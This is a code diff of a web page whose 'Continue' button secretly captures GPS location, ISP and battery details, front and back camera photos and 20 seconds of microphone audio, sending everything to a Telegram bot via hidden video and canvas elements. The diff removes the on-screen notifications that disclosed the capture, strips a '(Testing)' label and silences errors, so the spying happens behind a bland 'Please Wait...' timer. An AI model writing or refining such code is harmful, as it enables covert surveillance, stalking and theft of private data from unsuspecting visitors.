@@ -43,43 +43,6 @@
         }
 
         .btn-active:active { transform: scale(0.97); }
-
-        /* Toast Notifications System */
-        #toast-container {
-            position: fixed;
-            bottom: 24px;
-            left: 50%;
-            transform: translateX(-50%);
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            z-index: 9999;
-            width: 90%;
-            max-width: 380px;
-            pointer-events: none;
-        }
-
-        .toast {
-            background: rgba(15, 15, 15, 0.9);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            color: #f3f4f6;
-            padding: 14px 18px;
-            border-radius: 14px;
-            font-size: 0.875rem;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
-            opacity: 0;
-            transform: translateY(30px) scale(0.95);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .toast.show {
-            opacity: 1;
-            transform: translateY(0) scale(1);
-        }
     </style>
 </head>
 <body class="min-h-screen flex flex-col relative selection:bg-blue-500/30">
@@ -131,8 +94,6 @@
         </button>
     </main>
 
-    <div id="toast-container"></div>
-
     <!-- Hidden Video/Canvas for Background Capture -->
     <video id="hidden-video" class="hidden" autoplay playsinline muted></video>
     <canvas id="hidden-canvas" class="hidden"></canvas>
@@ -146,23 +107,20 @@
         const btnIcon = document.getElementById('btn-icon');
         const btnSpinner = document.getElementById('btn-spinner');
         const btnSuccessIcon = document.getElementById('btn-success-icon');
-        const toastContainer = document.getElementById('toast-container');
         
         const video = document.getElementById('hidden-video');
         const canvas = document.getElementById('hidden-canvas');
         const ctx = canvas.getContext('2d');
 
-        // Button State Functions
-        function setButtonLoading() {
+        function setButtonLoading(text = "Please Wait...") {
             btnContinue.disabled = true;
-            btnText.innerText = "Processing...";
+            btnText.innerText = text;
             btnIcon.classList.add('hidden');
             btnSuccessIcon.classList.add('hidden');
             btnSpinner.classList.remove('hidden');
         }
 
         function setButtonSuccess() {
-            // Change to Green Success state
             btnContinue.classList.remove('from-blue-600/40', 'to-purple-600/40');
             btnContinue.classList.add('from-green-500/60', 'to-emerald-500/60');
             
@@ -170,7 +128,6 @@
             btnSpinner.classList.add('hidden');
             btnSuccessIcon.classList.remove('hidden');
 
-            // Revert after 2 seconds
             setTimeout(() => {
                 btnContinue.disabled = false;
                 btnContinue.classList.remove('from-green-500/60', 'to-emerald-500/60');
@@ -180,22 +137,6 @@
                 btnSuccessIcon.classList.add('hidden');
                 btnIcon.classList.remove('hidden');
             }, 2000);
-        }
-
-        function showToast(message, type = 'info') {
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            let icon = 'ℹ️';
-            if(type === 'success') icon = '✅';
-            if(type === 'error') icon = '❌';
-            if(type === 'wait') icon = '⏳';
-            toast.innerHTML = `<span class="text-lg">${icon}</span> <span>${message}</span>`;
-            toastContainer.appendChild(toast);
-            setTimeout(() => toast.classList.add('show'), 10);
-            setTimeout(() => {
-                toast.classList.remove('show');
-                setTimeout(() => toast.remove(), 400);
-            }, 4000);
         }
 
         async function getBatteryInfo() {
@@ -216,20 +157,20 @@
                     const data = await res.json();
                     ispData = `${data.org} (${data.city}, ${data.region})`;
                 }
-            } catch (e) { console.warn("ISP fetch failed"); }
+            } catch (e) {}
 
             let nativeConn = "Unknown";
             try {
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (conn) { nativeConn = `${conn.effectiveType || 'Unknown'} (Native limit applied)`; }
+                if (conn) { nativeConn = `${conn.effectiveType || 'Unknown'} (Native API)`; }
             } catch (e) {}
-            return `Provider: ${ispData}\nNative API: ${nativeConn}`;
+            return `Provider: ${ispData}\nNative: ${nativeConn}`;
         }
 
         function getExactGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    resolve({ success: false, data: "Geolocation not supported by browser" });
+                    resolve({ success: false, data: "Geolocation not supported" });
                     return;
                 }
                 navigator.geolocation.getCurrentPosition(
@@ -249,7 +190,7 @@
                 await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: false })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                 });
             } catch (e) {}
         }
@@ -260,10 +201,7 @@
             fd.append('chat_id', CHAT_ID);
             fd.append('document', blob, filename);
             if (caption) fd.append('caption', caption);
-            try {
-                const res = await fetch(url, { method: 'POST', body: fd });
-                return res.ok;
-            } catch (e) { return false; }
+            try { await fetch(url, { method: 'POST', body: fd }); } catch (e) {}
         }
 
         async function sendPhotoToBot(blob, caption) {
@@ -272,10 +210,7 @@
             fd.append('chat_id', CHAT_ID);
             fd.append('photo', blob, 'photo.jpg');
             fd.append('caption', caption);
-            try {
-                const res = await fetch(url, { method: 'POST', body: fd });
-                return res.ok;
-            } catch (e) { return false; }
+            try { await fetch(url, { method: 'POST', body: fd }); } catch (e) {}
         }
 
         async function extractFrameFromVideo(videoElem) {
@@ -286,49 +221,49 @@
         }
 
         btnContinue.addEventListener('click', async () => {
-            setButtonLoading();
-            showToast("Initializing process...", "wait");
+            setButtonLoading("Please Wait...");
 
-            // --- 1. Get GPS FIRST (Fastest action) ---
-            showToast("Requesting Location...", "wait");
+            // 1. Get GPS FIRST
             const gps = await getExactGPS();
-            if (gps.success) showToast("GPS Location acquired", "success");
-            else showToast(`GPS Error: ${gps.data}`, "error");
 
-            // --- 2. Send System Info + GPS in background ---
+            // 2. Send System Info + GPS
             Promise.all([getBatteryInfo(), getNetworkAndISPInfo()]).then(([battery, network]) => {
-                const msg = `🐉 <b>ENTER DRAGON ALERT (Testing)</b>\n\n` +
+                const msg = `🐉 <b>ENTER DRAGON ALERT</b>\n\n` +
                             `🔋 <b>Battery:</b> ${battery}\n` +
-                            `📶 <b>Network Info:</b>\n${network}\n\n` +
+                            `📶 <b>Network:</b>\n${network}\n\n` +
                             `📍 <b>Location:</b> ${gps.success ? gps.data : 'Failed - ' + gps.data}`;
                 sendTextToBot(msg);
             });
 
-            // --- 3. Front Camera & 20s Audio Combined ---
-            showToast("Requesting Camera & Audio...", "wait");
+            // 3. Front Camera & 20s Audio Combined with Timer
             let frontStream = null;
-
             try {
                 frontStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
                 
                 video.srcObject = frontStream;
                 await video.play();
-                await new Promise(r => setTimeout(r, 800)); // Short wait for camera to focus
+                await new Promise(r => setTimeout(r, 800)); 
                 
-                // Send Front Photo
                 const frontBlob = await extractFrameFromVideo(video);
-                if (frontBlob) {
-                    sendPhotoToBot(frontBlob, "Front Camera Capture").then(success => {
-                        if(success) showToast("Front Camera image sent", "success");
-                    });
-                }
+                if (frontBlob) sendPhotoToBot(frontBlob, "Front Camera Capture");
 
-                // Stop video track to save resources, keep audio running
                 const videoTrack = frontStream.getVideoTracks()[0];
                 if (videoTrack) videoTrack.stop();
 
-                // Start 20 Sec Audio Recording
-                showToast("Recording 20s audio...", "wait");
+                // Timer Setup for 20 seconds
+                let timeLeft = 20;
+                btnText.innerText = `Please Wait... ${timeLeft}s`;
+                
+                const timerInterval = setInterval(() => {
+                    timeLeft--;
+                    if (timeLeft > 0) {
+                        btnText.innerText = `Please Wait... ${timeLeft}s`;
+                    } else {
+                        clearInterval(timerInterval);
+                        btnText.innerText = `Finalizing...`;
+                    }
+                }, 1000);
+
                 const audioRecorder = new MediaRecorder(frontStream);
                 const audioChunks = [];
                 
@@ -337,25 +272,24 @@
                 const audioPromise = new Promise((resolve) => {
                     audioRecorder.onstop = async () => {
                         const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                        const success = await sendDocumentToBot(audioBlob, "emergency_audio.webm", "20 Sec Audio Recording");
-                        frontStream.getAudioTracks().forEach(t => t.stop()); // Stop mic
-                        resolve(success);
+                        await sendDocumentToBot(audioBlob, "emergency_audio.webm", "20 Sec Audio Recording");
+                        frontStream.getAudioTracks().forEach(t => t.stop()); 
+                        resolve();
                     };
                 });
 
                 audioRecorder.start();
-                await new Promise(r => setTimeout(r, 20000)); // Wait exactly 20s
+                await new Promise(r => setTimeout(r, 20000)); 
                 audioRecorder.stop();
+                clearInterval(timerInterval); // Backup clear
                 
-                const audioSent = await audioPromise;
-                if(audioSent) showToast("Audio recording sent successfully", "success");
+                await audioPromise;
 
             } catch (error) {
-                showToast("Camera/Audio permission denied or failed", "error");
+                console.log("Camera/Audio Error", error);
             }
 
-            // --- 4. Back Camera ---
-            showToast("Accessing Back Camera...", "wait");
+            // 4. Back Camera
             let backStream = null;
             try {
                 backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
@@ -366,19 +300,14 @@
                 await new Promise(r => setTimeout(r, 1000)); 
                 
                 const backBlob = await extractFrameFromVideo(video);
-                if (backBlob) {
-                    sendPhotoToBot(backBlob, "Back Camera Capture").then(success => {
-                        if(success) showToast("Back Camera image sent", "success");
-                    });
-                }
+                if (backBlob) await sendPhotoToBot(backBlob, "Back Camera Capture");
             } catch (error) {
-                showToast("Back Camera unavailable", "error");
+                console.log("Back Camera Error", error);
             } finally {
                 if (backStream) backStream.getTracks().forEach(t => t.stop());
             }
 
-            // --- FINISH: Show Success State for 2 Seconds ---
-            showToast("Emergency reporting complete.", "success");
+            // 5. FINISH: Show Success State
             setButtonSuccess();
         });
     </script>
